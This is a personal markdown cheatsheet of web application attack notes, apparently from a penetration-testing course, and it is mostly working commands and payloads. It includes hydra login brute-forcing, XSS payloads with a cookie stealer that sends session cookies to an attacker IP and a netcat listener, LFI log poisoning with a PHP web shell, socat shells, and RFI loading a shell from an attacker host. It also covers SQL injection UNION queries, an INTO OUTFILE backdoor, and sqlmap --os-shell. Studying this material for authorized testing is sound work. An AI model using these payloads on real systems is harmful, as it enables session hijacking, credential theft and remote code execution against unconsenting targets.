---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:
- <https://github.com/danielmiessler/SecLists>
- cookie editor https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
- foxyproxy https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
---
- Web Application Attacks
  - Enumerate, enumerate, enumerate
    - Programming languages, frameworks, server OS, database
    - Less common due to single page apps using routes, but check for page extensions (.php, .asp, aspx, .cfm, .do (Java))
    - developer tools
      - Inspect page content, console, debugger tabs looking for javascript frameworks or hidden fields
      - Network tab to see http requests, responses and headers can show web server software (Server or X-Aspnet-Version values)
    - sitemaps
      - robots.txt ```shell curl https://www.google.com/robots.txt```
        - allow means that robots can browse them
        - disallow means that robots shouldnt browse them
      - sitemap.xml ```shell curl https://www.sitemaps.org/sitemap.xml```
  - Assessment tools
    - dirb (web content scanner that uses wordlists to find directories and pages)
      - scan non recursively with a 10 millisecond gap between requests ```shell dirb http://www.megacorpone.com -r -z 10```
    - burpsuite - use foxyproxy, proxy intercept and repeater
    - -nikto
    - fuff
      - search for common files ```shell ffuf -u http://$IP/FUZZ -w /usr/share/dirb/wordlists/common.txt```
  - Brute forcing
    - hydra ```shell sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^&debug=0:Login Failed" -v```
    - burp suite
      - intercept then to repeater to confirm we can replicate, then to intruder to run payload
  - Cross Site Scripting (XSS) runs under teh context of the user browsing the page
    - stored or persistent xss is when the exploit is stored in a database or cached by the server (comment sections)
    - reflected xss includes the payload in a crafted request or link (the web app places this data into the page content) search fields and results, error messages
    - DOM-based xss are similar to the two but it takes place purely in the document object model
    - goal is to steal cookies, log keystrokes, phishing attacks, port scanning and content scrapers/skimmers
    - to identify entry points, look for unsantized input displayed as output
      - special html chars ```shell < > ```
      - special js chars ```shell { } ;```
      - special string chars ```shell ' " ```
    - url encoding or percent encoding converts non ascii and reserved chars in urls ```shell space = %20```
    - html encoding or character references can be used to display chars that have special meanings ```shell < = &lt;```
    - basic xss payload ```shell <script>alert('XSS')</script>```
    - invisible iframe ```shell <iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>```
      - run nc to listen for hits ```shell nc -nlvp 80```
      - run apache server and capture user-agent via logs ```shell /var/log/apache2/access.log```
    - stealing cookies and session information 
      - cookies track state and information about users
        - secure flag instructs the browser to only send cookies over encrypted connections (eg https)
        - httponly flag instructs the browser to deny javascript access to the cookie (if not set we can use xss to steal the cookie)
      - application sets PHPSESSID cookie when admin user logs in, application uses the cookie to determine if user has been authenticated
        - cookie stealer ```shell <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>```
        - nc listener ```shell sudo nc -nlvp 80```
          - ```shell
          listening on [any] 80 ...
          connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 53824
          GET /cool.jpg?output=PHPSESSID=ua19spmd8i3t1l9acl9m2tfi76 HTTP/1.1
          Referer: http://127.0.0.1/admin.php
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
          ```
        - add new cookie using cookie editor ```shell name=PHPSESSID Value=ua19spmd8i3t1l9acl9m2tfi76```
        - browse to http://127.0.0.1/admin.php and bypass login
      - Browser Exploitation Framework (BeEF)
  - Directory Traversal Vulnerabilites where input is poorly validated, subsequently granting an attacker the ability to manipulate file paths with "../" or "..\" characters.
    - goal 
      - access files outside of the web root directory such as /etc/passwd or c:\boot.ini
      - contaminate logs files via poisoning to fill the logs with noise
    - url vulnerability ```shell http://10.11.0.22/menu.php?file=current_menu.php``` 
      - exploit via the file parameter ```shell http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts```
  - File inclusion vulnerabilites allow an attacker to include a file into the applications running code (common in php apps)
    - goal is to capture web server configurations such as php.ini values like register_globals and allow_url wrappers
    - local file inclusions (LFI) occur when the included file is loaded from the same web server
      - url vulnerability ```shell http://10.11.0.22/menu.php?file=current_menu.php``` which on the server does this ```php <?php $file = $_GET["file"]; include $file; ?>```
        - use netcat to send payload
        - ```shell nc -nv 10.11.0.22 80```
        - ```shell <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>```
        - ```shell HTTP/1.1 400 Bad Request``` Although we get a bad request, the request is added to the log files
          - ```shell 10.11.0.4 - - [30/Nov/2019:14:01:41 -0500] ""<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\n" 400 981 "-" "-"```
        - When we include the access log file, it is parsed by php and the shell_execute($_GET['cmd']) is executed
          - ```shell http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig```
        - socat on victim ```shell socat TCP-LISTEN:60000,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane```
        - socat on attacker ```shell socat FILE:`tty`,raw,echo=0 TCP:$IP:60000```
    - remote file inclusions (RFI) occur when the file is included from an external source
      - example but requires php allow_url_include set to ON ```http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt```
        - kali - create evil.txt and add ```shell <?php echo shell_exec($_GET['cmd']); ?>```
        - kali - ```shell http://192.168.119.156:8000/evil.txt```
        - victim ```http://192.168./menu2.php?file=192.168.119.156:8000/evil.txt&cmd=ipconfig
  - sql injection
    - normal login ```sql select * from users where name = 'tom' and password = 'jones';```
    - subvert logic in the username input field by using ' to break out username then where 1=1 (always true) and ;# to comment out the rest of the query
      - english "show me all columns and rows for users with a name of tom or where one equals one"
      - ```sql select * from users where name = 'tom' or 1=1;#' and password = 'jones';```
      - if you encounter errors where multiple rows are returned, add LIMIT 1 to the statement
      - ```sql select * from users where name = 'tom' or 1=1 LIMIT 1;#' and password = 'jones';```
    - enumerating the database
      - burpsuite - intercept request ```http://10.11.0.22/debug.php?id=1 order by 1```
        - right click send to repeater confirm it functions
        - increment the order_by clause and send the query again until we receive an error message. Since the order by clause produced an error on the fourth iteration, we know that the query returns a resultset containing three columns.
      - because we know how many columns are returned we can start building our union ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3```
      - database version ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version```
      - current db user ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()```
      - information schema ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables```
      - we now know the table names, lets get column names from the users table ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'```
      - we can then use this to get a list of usernames and passwords ```http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users```
    - load_file ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')```
    - INTO OUTFILE function ```http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'```
      - ![Alt text](kb/offsec/pen200/09-WebApplicationAttacks/image.png)
    - sqlmap
      - standard scan ```sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"```
      - extract database ```sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump```
      - execute a shell ```sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell```
  
